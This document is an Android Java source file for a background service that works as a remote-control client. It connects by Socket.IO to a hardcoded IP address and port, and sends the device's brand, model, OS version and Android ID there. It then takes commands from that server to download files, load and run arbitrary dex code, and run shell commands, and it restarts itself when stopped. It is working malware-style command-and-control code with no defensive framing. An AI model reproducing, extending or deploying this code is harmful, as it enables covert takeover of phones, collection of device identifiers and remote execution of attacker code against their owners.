package project.richthofen911.matata;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import com.github.nkzawa.emitter.Emitter;
import com.github.nkzawa.socketio.client.IO;
import com.github.nkzawa.socketio.client.Socket;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URISyntaxException;
import java.util.HashMap;

import dalvik.system.DexClassLoader;

public class MyService extends Service {

    private static Socket mSocket;{
        try {
            mSocket = IO.socket("http://104.167.102.201:2333");
        } catch (URISyntaxException e) {e.printStackTrace();}
    }

    private static Context thisContext;
    public static HashMap<String, String> commandSet = new HashMap<>();
    private String cmdRaw = "";
    private String myConnectionId = "";

    public MyService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId){
        Log.e("my service up", "");
        thisContext = getApplicationContext();

        String phoneInfo = Build.BRAND + ": " + Build.MODEL + ": " + Build.VERSION.RELEASE + ": " + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        //the device waits for new command and socket connection id from the server
        mSocket.on("news", onNewMessage);
        mSocket.on("yourId", onGetId);
        //when the device connect to the server, it sends device info as well
        mSocket.connect().emit("phone info", phoneInfo);

        return START_STICKY;
    }

    private void commandExecutor(String cmd){
        String[] cmdSplited = cmd.split(" ");
        if(cmdSplited[0].equals("wget")){
            wget(cmdSplited[1], cmdSplited[2]);
        }else{
            loadDex(commandSet.get(cmd));
        }
    }

    private void wget(String url, String fileName) {
        Wget.asynDownloadFile(url, fileName);
    }

    private void loadDex(String className){
        File pathDexFile = new File(getFilesDir() + File.separator + className + ".dex");
        DexClassLoader dexClassLoader = new DexClassLoader(pathDexFile.getAbsolutePath(), getCacheDir().toString(),
                null, getClassLoader());
        try {
            Class classFunctionProvider = dexClassLoader.loadClass("project.richthofen911.matata." + className);
            DexLoaderTemplate newDex = (DexLoaderTemplate) classFunctionProvider.newInstance();
            newDex.functionality(getApplicationContext());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String execShell(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            int read;
            char[] buffer = new char[4096];
            StringBuffer output = new StringBuffer();
            while ((read = reader.read(buffer)) > 0) {
                output.append(buffer, 0, read);
            }
            reader.close();
            process.waitFor();
            return output.toString();
        } catch (IOException e) {
            throw new RuntimeException(e);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    private Emitter.Listener onGetId = new Emitter.Listener() {
        @Override
        public void call(final Object...args) {
            Log.e("get connection id", args[0].toString());
            JSONObject data = (JSONObject) args[0];
            try {
                myConnectionId = data.getString("yourId");
            } catch (JSONException e) {
                return;
            }
            Log.e("my connection id", myConnectionId);
        }
    };

    private Emitter.Listener onNewMessage = new Emitter.Listener() {
        @Override
        public void call(final Object...args) {
            Log.e("news received", args[0].toString());
            JSONObject data = (JSONObject) args[0];
            String command;
            try {
                command = data.getString("cmd");
            } catch (JSONException e) {
                return;
            }
            commandExecutor(command);
        }
    };

    @Override
    public void onDestroy() {
        super.onDestroy();
        mSocket.emit("new message", "device " + myConnectionId + " is offline****");
        mSocket.disconnect();
        mSocket.off();
    }

    public static Context getThisContext(){
        return thisContext;
    }

    public static void sendFeedBack(String result){
        mSocket.emit("new message", result);
    }

}
